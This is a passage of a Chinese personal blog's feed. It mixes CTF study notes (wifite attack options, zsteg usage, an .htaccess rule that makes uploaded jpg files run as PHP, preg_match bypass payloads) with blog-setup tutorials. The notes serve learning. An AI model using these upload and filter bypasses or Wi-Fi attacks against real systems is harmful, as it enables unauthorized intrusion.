&lt;dic&gt;    使用&lt;dic&gt; wordlist文件破解WPA握手      [off]</span><br><span class="line">    -dict &lt;file&gt;    指定要在破解WPA时使用的字典            [phpbb.txt]</span><br><span class="line">    -aircrack       使用aircrack验证握手                   [on]</span><br><span class="line">    -pyrit          使用pyrit验证握手                      [off]</span><br><span class="line">    -tshark         使用tshark验证握手                     [on]</span><br><span class="line">    -cowpatty       用cowpatty验证握手                     [off]</span><br><span class="line"></span><br><span class="line">   WEP</span><br><span class="line">    -wep            只针对WEP网络                 [off]</span><br><span class="line">    -pps &lt;num&gt;      设置每秒注入的数据包数        [600]</span><br><span class="line">    -wept &lt;sec&gt;     秒等待每次攻击，0意味着无休止 [600]</span><br><span class="line">    -chopchop       使用chopchop攻击              [on]</span><br><span class="line">    -arpreplay      使用arpreplay攻击             [on]</span><br><span class="line">    -fragment       使用碎片攻击                  [on]</span><br><span class="line">    -caffelatte     使用caffe-latte攻击           [on]</span><br><span class="line">    -p0841          使用-p0841攻击                [on]</span><br><span class="line">    -hirte          使用 hirte (cfrag)攻击        [on]</span><br><span class="line">    -nofakeauth     如果假认证失败，则停止攻击    [off]</span><br><span class="line">    -wepca &lt;n&gt;      当iv的数量超过n时开始破解     [10000]</span><br><span class="line">    -wepsave        将.cap文件的副本保存到此目录  [off]</span><br><span class="line"></span><br><span class="line">   WPS</span><br><span class="line">    -wps        只针对WPS网络                                 [off]</span><br><span class="line">    -wpst &lt;sec&gt;     最大等待新的重试，然后放弃(0: never)      [660]</span><br><span class="line">    -wpsratio &lt;per&gt; 成功的PIN尝试次数/总尝试次数的最小比例    [0]</span><br><span class="line">    -wpsretry &lt;num&gt; 在放弃之前，同一个PIN的最大重试次数       [0]</span><br><span class="line"></span><br><span class="line">   EXAMPLE</span><br><span class="line">    ./wifite.py -wps -wep -c 6 -pps 600</span><br><span class="line"></span><br><span class="line"> [+] quitting</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>zsteg使用命令</title>
    <link href="http://li-yian.site/2024/01/20/zsteg%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://li-yian.site/2024/01/20/zsteg%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2024-01-19T16:00:00.000Z</published>
    <updated>2024-02-01T14:46:37.975Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="zsteg使用命令"><a href="#zsteg使用命令" class="headerlink" title="zsteg使用命令"></a>zsteg使用命令</h1><p>zsteg可以检测PNG和BMP图片里的隐写数据。</p><p>目前，zsteg支持检测：</p><ul><li>LSB steganography in PNG &amp; BMP</li><li>zlib-compressed data</li><li>OpenStego</li><li>Camouflage 1.2.1</li><li>LSB with The Eratosthenes set</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">zsteg &lt;image_path&gt;: 分析图像并尝试提取隐藏在图像中的数据，并将成功提取的数据显示在终端上。</span><br><span class="line">尝试所有已知的组合</span><br><span class="line">zsteg -a &lt;image_path&gt;: 使用所有的隐写方法尝试提取数据。</span><br><span class="line">zsteg -E &lt;extension&gt; &lt;image_path&gt;: 使用指定扩展名的文件存储提取的数据。</span><br><span class="line">zsteg -e &lt;method&gt; &lt;image_path&gt;: 使用特定的隐写方法提取数据。</span><br><span class="line">zsteg -f &lt;image_path&gt;: 列出图像中包含的文件。</span><br><span class="line">zsteg -h: 显示 zsteg 的帮助信息。</span><br><span class="line">zsteg -i &lt;index&gt; &lt;image_path&gt;: 提取指定索引的数据。</span><br><span class="line">zsteg -L: 列出 zsteg 支持的所有隐写方法。</span><br><span class="line">zsteg -l &lt;image_path&gt;: 显示图像的大小和其他详细信息。</span><br><span class="line">zsteg -o &lt;output_path&gt; &lt;image_path&gt;: 将提取的数据保存到指定的输出文件中。</span><br><span class="line">zsteg -P &lt;password&gt; &lt;image_path&gt;: 使用密码解密提取的数据。</span><br><span class="line">zsteg -s &lt;method&gt; &lt;image_path&gt;: 显示特定的隐写方法的相关信息。</span><br><span class="line">zsteg -v: 显示 zsteg 的版本信息。</span><br><span class="line">显示细节</span><br><span class="line">zsteg pcat.png -v</span><br></pre></td></tr></table></figure><p>请注意，上述命令中的 <image_path> 是要分析的图像文件的路径，<method> 是要使用的隐写方法，<extension> 是提取数据时使用的文件扩展名，<index> 是要提取的数据的索引，<output_path> 是要保存提取数据的输出文件的路径，<password> 是用于解密数据的密码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# zsteg png.png                                                </span><br><span class="line">b1,r,msb,xy         .. text: &quot;@  &gt;&#x27;qvX&quot;</span><br><span class="line">b1,rgb,lsb,xy       .. file: PNG image data, 1023 x 1023, 8-bit/color RGBA, non-interlaced </span><br><span class="line">b1,rgba,lsb,xy      .. file: PGP Secret Key -</span><br><span class="line">b2,r,msb,xy         .. file: PGP Secret Sub-key -</span><br><span class="line">b2,g,msb,xy         .. text: &quot;&#125;WUwW&#125;Wu&quot;</span><br><span class="line">b2,rgb,lsb,xy       .. text: &quot;~vXAy*GK&quot;</span><br><span class="line">b3,rgb,msb,xy       .. text: &quot;8ATQ\t\&quot;DJ&quot;</span><br><span class="line">b3,bgr,msb,xy       .. text: &quot;5x\nr&#x27;V@5&quot;</span><br><span class="line">b3,abgr,msb,xy      .. text: &quot;pdGvdGv\r&quot;</span><br><span class="line">b4,g,lsb,xy         .. text: &quot;2T#GD$DD\&quot;\&quot;$wr\&quot;\&quot;0&quot;</span><br><span class="line">b4,b,lsb,xy         .. file: MIPSEL ECOFF executable not stripped - version 236.206                   </span><br><span class="line">b4,rgb,msb,xy       .. text: &quot;wwwww77C7B&quot;</span><br><span class="line">b4,bgr,msb,xy       .. text: &quot;syPsqPw1&quot;</span><br><span class="line">                                                                             </span><br><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# zsteg -e b1,rgb,lsb,xy png.png -&gt; out.png  # 提取该通道图片</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>文件上传绕过</title>
    <link href="http://li-yian.site/2024/01/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
    <id>http://li-yian.site/2024/01/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</id>
    <published>2024-01-19T16:00:00.000Z</published>
    <updated>2024-02-01T14:48:19.001Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h1><h2 id="1，后缀-htaccess文件"><a href="#1，后缀-htaccess文件" class="headerlink" title="1，后缀.htaccess文件"></a>1，后缀.htaccess文件</h2><p>是Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p><p><strong>.htaccess文件内容</strong>：<code>SetHandler application/x-httpd-php</code>的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错</p><p>这里随便访问一个不存在的页面造成<code>Not Found</code>报错，就可以看到服务器信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>表示将jpg文件解析为php文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>私人图床搭建</title>
    <link href="http://li-yian.site/2023/12/23/%E7%A7%81%E4%BA%BA%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA/"/>
    <id>http://li-yian.site/2023/12/23/%E7%A7%81%E4%BA%BA%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA/</id>
    <published>2023-12-22T16:10:40.412Z</published>
    <updated>2023-12-22T16:10:40.413Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Typora+PicGo+Alist 私人图床教程-CSDN</p><p><a href="https://blog.csdn.net/whale0306/article/details/128870341">教程</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Post-Abstract-AI</title>
    <link href="http://li-yian.site/2023/12/14/post_Abstract_AI/"/>
    <id>http://li-yian.site/2023/12/14/post_Abstract_AI/</id>
    <published>2023-12-13T16:00:00.000Z</published>
    <updated>2023-12-16T06:56:47.175Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载博主<a href="https://blog.guole.fun/charts/">Hexo-tag-charts Demo | Guo Le’s Blog</a></p><p><a href="https://summary.zhheo.com/static/matrix.html">随机访问已经支持TianliGPT的博客</a></p><p>最近研究AI在博客和文章领域的应用，发现AI摘要是一个很不错的方向，研究了很久给搞出来了。在这篇文章中，我将帮助大家如何让你的博客接入TianliGPT。</p><h2 id="什么是TianliGPT"><a href="#什么是TianliGPT" class="headerlink" title="什么是TianliGPT"></a>什么是TianliGPT</h2><p>TianliGPT是一个专业的文字摘要生成工具，你可以将需要提取摘要的文本内容发送给TianliGPT，稍等一会他就可以给你发送一个基于这段文本内容的摘要。</p><ul><li>实时生成的摘要</li><li>自动生成，无需人工干预</li><li>一次生成，再次生成无需消耗key</li><li>包含文字审核过滤，适用于中国大陆</li><li>支持中国大陆访问</li></ul><h2 id="如何部署TianliGPT"><a href="#如何部署TianliGPT" class="headerlink" title="如何部署TianliGPT"></a>如何部署TianliGPT</h2><p>我们可以通过在网页中嵌入TianliGPT的服务支持，让TianliGPT能够获取到你需要提交的内容。</p><ol><li>你需要在博客后面位置引入js和css（<strong>引入在网站的任意位置</strong>）</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn1.tianli0.top/gh/zhheo/Post-Abstract-AI@0.15.2/tianli_gpt.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> tianliGPT_postSelector = <span class="string">&#x27;#post #article-container&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> tianliGPT_key = <span class="string">&#x27;5Q5mpqRK5DkwT1X9Gi5e&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn1.tianli0.top/gh/zhheo/Post-Abstract-AI@0.15.2/tianli_gpt.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>我们需要更改一些参数来让这个模型运作起来。</li></ol><p><code>tianliGPT_postSelector</code>和<code>tianliGPT_key</code></p><h3 id="tianliGPT-postSelector"><a href="#tianliGPT-postSelector" class="headerlink" title="tianliGPT_postSelector"></a>tianliGPT_postSelector</h3><p>这个参数是填写你的博客文章所在的元素属性的选择器，在生成提交的文本时，只会将这个选择器对应的元素内的文本进行提交，并且在这个选择器对应的元素上放插入AI摘要。如果你使用的是Butterfly主题，那么为<code>#post #article-container</code>。</p><p>这里列出一些常见博客主题的选择器值（部分未经过测试，如果有问题欢迎反馈）：</p><table><thead><tr><th>主题名称</th><th>tianliGPT_postSelector</th><th>tianliGPT_postURL</th><th>备注</th></tr></thead><tbody><tr><td><a href="https://flowus.cn/zhheo/share/927667b2-ba27-42b1-98f2-8fb184720ed2">hexo-theme-butterfly</a></td><td>#post #article-container</td><td>无需添加</td><td>无</td></tr><tr><td><a href="https://flowus.cn/zhheo/share/a8c7101e-9b06-4ec8-9063-0fe3eef31f5c">hexo-theme-fluid</a></td><td>#board .post-content</td><td>无需添加</td><td>无</td></tr><tr><td>hexo-theme-next</td><td>#posts .post-body</td><td>无需添加</td><td>无</td></tr><tr><td>hexo-theme-stellar</td><td>.md-text.content.post</td><td>无需添加</td><td>无</td></tr><tr><td>hexo-theme-volantis</td><td>#post #post-body</td><td>无需添加</td><td>无</td></tr><tr><td>hugo-theme-DoIt</td><td>.page.single:not(.special) .content</td><td>无需添加</td><td>无</td></tr><tr><td>halo-theme-xue</td><td>#container .article-content #lightGallery</td><td>无需添加</td><td>无</td></tr><tr><td><a href="https://flowus.cn/08d8f6e4-d487-40b9-951e-8c0c3df7506f">wordpress: argon</a></td><td>#post_content</td><td>无需添加</td><td>无</td></tr><tr><td>wordpress: 7B2</td><td>#primary-home .entry-content</td><td>修改里面的域名：<code>b2.7b2.com/*.html</code></td><td>无</td></tr><tr><td>wordpress：pix</td><td>.single-content</td><td><code>https://*/*.html</code></td><td>无</td></tr><tr><td>wordpress: Sakurairo</td><td>.post .entry-content</td><td>无需添加</td><td>无</td></tr><tr><td><a href="https://flowus.cn/88b69f42-e0f7-482c-9941-24a06c97d6d0">wordpress: 子比主题</a></td><td>.single-post .wp-posts-content</td><td>无需添加</td><td>无</td></tr><tr><td>wordpress: CorePress</td><td>.post-content-content</td><td>无需添加</td><td>无</td></tr><tr><td>wordpress: OneNav</td><td>.post-template-default .panel-body</td><td>无需添加</td><td>无</td></tr><tr><td>valaxy-theme-yun</td><td>.content .markdown-body</td><td><code>*/posts/*</code></td><td>无</td></tr><tr><td>typecho-bearsimple</td><td>#post-content #bearsimple-images</td><td>无需添加</td><td>无</td></tr><tr><td>typecho-bearhoney</td><td>.post-content-block .content</td><td>无需添加</td><td>无</td></tr><tr><td>typecho-handsome</td><td>#postpage #md_handsome_origin</td><td>无需添加</td><td>无</td></tr><tr><td><a href="/issues/27">typecho-joe</a></td><td>.joe_post .joe_detail__article</td><td>无需添加</td><td>无</td></tr><tr><td><a href="/issues/32">typecho-void</a></td><td>.articleBody</td><td>无需添加</td><td>无</td></tr></tbody></table><p>如果你没有在上面看到你的主题，查看<a href="https://flowus.cn/zhheo/7a353126-f225-4e5c-8c11-f5adefe85b7f">通用教程</a>，手把手教你如何使用前端选择器。</p><p><strong>如果你写了你的主题适配教程，欢迎在issues里投稿，我会收录到官方文档中，帮助更多的小伙伴搭建。</strong></p><h3 id="tianliGPT-key"><a href="#tianliGPT-key" class="headerlink" title="tianliGPT_key"></a>tianliGPT_key</h3><p>到<a href="https://afdian.net/item/f18c2e08db4411eda2f25254001e7c00">爱发电</a>中购买，10元5万字符（限时折扣9元）。请求过的内容再次请求不会消耗key，可以无限期使用。</p><ul><li>相比实时请求openai，使用tianliGPT可以让你请求过的内容不再消耗key，适合生产环境。</li><li>相比实时请求openai，使用tianliGPT可以在国内更快速的获取摘要。</li><li>符合中国大陆法律法规。</li><li>key消耗完毕，已经请求过的内容仍然可以继续请求，避免了被恶意请求造成的资金损失和业务停摆。</li></ul><p>购买完成后，进入管理后台：<a href="https://summary.zhheo.com/">https://summary.zhheo.com/</a></p><p>登录后点击右上角的“添加新网站”，输入密钥即可</p><p>即可绑定成功。</p><h2 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h2><p>更多的参数变量详见<a href="https://flowus.cn/9be089e8-667e-4b0e-93c3-ad69697ce673">高级文档</a></p><p>例如关闭文字动画、限制每次提交最大字数等。</p><h2 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h2><p>升级版本方式：只需要将js和css链接中的<code>@0.5</code>这种的版本号更改为最新的版本即可。</p><p>最新版本的位置：</p><h2 id="开发团队"><a href="#开发团队" class="headerlink" title="开发团队"></a>开发团队</h2><p>后端开发：<a href="https://github.com/Tianli0">@Tianli</a></p><p>产品设计与前端开发：<a href="https://github.com/zhheo">@张<a href="https://blog.guole.fun/charts/">Hexo-tag-charts Demo | Guo Le’s Blog</a>洪Heo</a></p><h2 id="更多支持TianliGPT的项目"><a href="#更多支持TianliGPT的项目" class="headerlink" title="更多支持TianliGPT的项目"></a>更多支持TianliGPT的项目</h2><p><a href="https://github.com/qxchuckle/Post-Summary-AI">Post-Summary-AI</a> - 轻笑开发的博客摘要生成工具</p><p><a href="https://github.com/rootlexblog/hexo-ai-excerpt">hexo-ai-excerpt</a> - 在本地部署时添加AI摘要</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="建站" scheme="http://li-yian.site/tags/%E5%BB%BA%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>butterfly添加天气插件</title>
    <link href="http://li-yian.site/2023/12/13/butterfly%E6%B7%BB%E5%8A%A0%E5%A4%A9%E6%B0%94%E6%8F%92%E4%BB%B6/"/>
    <id>http://li-yian.site/2023/12/13/butterfly%E6%B7%BB%E5%8A%A0%E5%A4%A9%E6%B0%94%E6%8F%92%E4%BB%B6/</id>
    <published>2023-12-12T16:00:00.000Z</published>
    <updated>2023-12-16T05:32:43.607Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>参考教程：<a href="https://blog.mxycn.cn/2022/08/24/header-weather/">https://blog.mxycn.cn/2022/08/24/header-weather/</a></p><p>在线网站:  <a href="https://www.seniverse.com/">https://www.seniverse.com/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="建站" scheme="http://li-yian.site/tags/%E5%BB%BA%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>preg_match 函数绕过</title>
    <link href="http://li-yian.site/2023/12/13/preg_match%20%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"/>
    <id>http://li-yian.site/2023/12/13/preg_match%20%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</id>
    <published>2023-12-12T16:00:00.000Z</published>
    <updated>2023-12-16T06:54:41.991Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>PHP手册告诉我们， preg_match 函数的返回值有3种，分别为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`returns <span class="number">1</span>; <span class="comment">// 如果匹配到.` </span></span><br><span class="line">`returns <span class="number">0</span>; <span class="comment">// 如果未匹配到.` </span></span><br><span class="line">`returns <span class="literal">FALSE</span>; <span class="comment">// 发生错误时.`</span></span><br></pre></td></tr></table></figure><p><a href="https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">相关网站总结，8种方法</a></p><h2 id="1-数组绕过"><a href="#1-数组绕过" class="headerlink" title="1.数组绕过"></a>1.数组绕过</h2><p>原理：<br>preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h2 id="2-PHP利用PCRE回溯流量限制绕过某些安全限制"><a href="#2-PHP利用PCRE回溯流量限制绕过某些安全限制" class="headerlink" title="2.PHP利用PCRE回溯流量限制绕过某些安全限制"></a>2.PHP利用PCRE回溯流量限制绕过某些安全限制</h2><p>Payload:?a&#x3D;ssss………..省略n个字符，突破100万</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://li-yian.site/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>使用venv创建python虚拟环境</title>
    <link href="http://li-yian.site/2023/12/10/%E8%A6%81%E4%BD%BF%E7%94%A8Python%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"/>
    <id>http://li-yian.site/2023/12/10/%E8%A6%81%E4%BD%BF%E7%94%A8Python%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</id>
    <published>2023-12-10T09:44:42.397Z</published>
    <updated>2023-12-16T06:53:55.772Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ol><li>打开命令行终端。</li><li>导航到您希望创建虚拟环境的目录。</li><li>运行以下命令来创建一个新的虚拟环境（以myenv为例，您可以替换为您自己的环境名称）：</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python -m venv myenv</span></span><br></pre></td></tr></table></figure><p>这将在当前目录下创建一个名为myenv的虚拟环境。</p><ol><li>激活虚拟环境。在Windows上，运行以下命令：</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myenv\Scripts\<span class="built_in">activate</span></span><br></pre></td></tr></table></figure><p>在macOS和Linux上，运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> myenv/bin/activate</span><br></pre></td></tr></table></figure><p>激活虚拟环境后，您将在命令行提示符前看到虚拟环境的名称。</p><ol><li>现在，您可以在激活的虚拟环境中安装和运行Python包和脚本，而不会干扰全局Python环境。</li><li>当您完成工作并希望退出虚拟环境时，可以运行以下命令来停用虚拟环境：</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deactivate</span></span><br></pre></td></tr></table></figure><p>这将恢复您的命令行终端以使用全局Python环境。</p><p>请注意，虚拟环境仅在激活时有效，因此每次您重新打开命令行终端时，都需要激活虚拟环境。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="python" scheme="http://li-yian.site/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>hexo Ubuntu github nginx搭建个人博客分享</title>
    <link href="http://li-yian.site/2023/12/10/hexo%20Ubuntu%20github%20nginx%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%88%86%E4%BA%AB/"/>
    <id>http://li-yian.site/2023/12/10/hexo%20Ubuntu%20github%20nginx%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%88%86%E4%BA%AB/</id>
    <published>2023-12-10T06:50:46.000Z</published>
    <updated>2024-01-15T07:51:43.692Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一，工具和环境准备"><a href="#一，工具和环境准备" class="headerlink" title="一，工具和环境准备"></a>一，工具和环境准备</h1><h3 id="1，安装node-js，提供hexo运行的环境"><a href="#1，安装node-js，提供hexo运行的环境" class="headerlink" title="1，安装node.js，提供hexo运行的环境"></a>1，安装<a href="https://nodejs.org/en/download/">node.js</a>，提供hexo运行的环境</h3><h3 id="2，安装git，版本控制工具，用来推送博客。"><a href="#2，安装git，版本控制工具，用来推送博客。" class="headerlink" title="2，安装git，版本控制工具，用来推送博客。"></a>2，安装<a href="https://git-scm.com/download/win">git</a>，版本控制工具，用来推送博客。</h3><p>使用node自带的npm工具安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`npm install -g cnpm --registry=https://registry.npm.taobao.org`</span><br></pre></td></tr></table></figure><h3 id="3，hexo安装，生成博客的静态网页。"><a href="#3，hexo安装，生成博客的静态网页。" class="headerlink" title="3，hexo安装，生成博客的静态网页。"></a>3，hexo安装，生成博客的静态网页。</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">或者</span><br><span class="line">cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure><h3 id="4，租赁一台服务器，用来部署博客网站，"><a href="#4，租赁一台服务器，用来部署博客网站，" class="headerlink" title="4，租赁一台服务器，用来部署博客网站，"></a>4，租赁一台服务器，用来部署博客网站，</h3><p>本教程使用的<a href="https://www.鑫来利.cn/login">阿文云香港服务器</a>，系统为Ubuntu系统。</p><h3 id="5，准备xshell7和xftp7工具，"><a href="#5，准备xshell7和xftp7工具，" class="headerlink" title="5，准备xshell7和xftp7工具，"></a>5，准备<a href="https://www.xshell.com/zh/free-for-home-school/">xshell7</a>和<a href="https://www.xshell.com/zh/free-for-home-school/">xftp7</a>工具，</h3><p>方便对云服务器操作，都提供学生免费版，可以通过邮箱申请。</p><h3 id="6，下载notepad-工具，"><a href="#6，下载notepad-工具，" class="headerlink" title="6，下载notepad++工具，"></a>6，下载notepad++工具，</h3><p>通过它对hexo的配置文件和主题的配置文件操作，如果电脑上安装的有VS，也可以不下载。</p><h3 id="7，nginx，Web服务器，安装在云服务器上，用于支持外部访问。"><a href="#7，nginx，Web服务器，安装在云服务器上，用于支持外部访问。" class="headerlink" title="7，nginx，Web服务器，安装在云服务器上，用于支持外部访问。"></a>7，nginx，Web服务器，安装在云服务器上，用于支持外部访问。</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span 